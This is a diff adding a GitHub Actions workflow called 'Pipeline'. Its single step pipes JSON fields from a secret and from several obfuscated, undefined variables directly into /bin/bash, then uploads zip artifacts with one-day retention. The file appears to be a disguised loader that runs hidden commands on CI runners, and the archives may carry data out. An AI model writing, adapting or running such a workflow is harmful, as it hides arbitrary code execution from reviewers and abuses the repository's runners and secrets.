@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          gi85687: ${{ secrets.gi85687 }}
+        run: |
+          printf '%s' "$gi85687" | jq -r .z8 | /bin/bash
+          printf '%s' "$zivh46669" | jq -r .kfhjh939 | /bin/bash
+          printf '%s' "$tle35" | jq -r .kmsvj64108 | /bin/bash
+          printf '%s' "$lcl1986" | jq -r .il4 | /bin/bash
+          printf '%s' "$zgop734" | jq -r .tnmh7493 | /bin/bash
+          echo $l2 | jq -r .rag26011 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: GpagDamk
+          path: "*.zip"
+          retention-days: 1
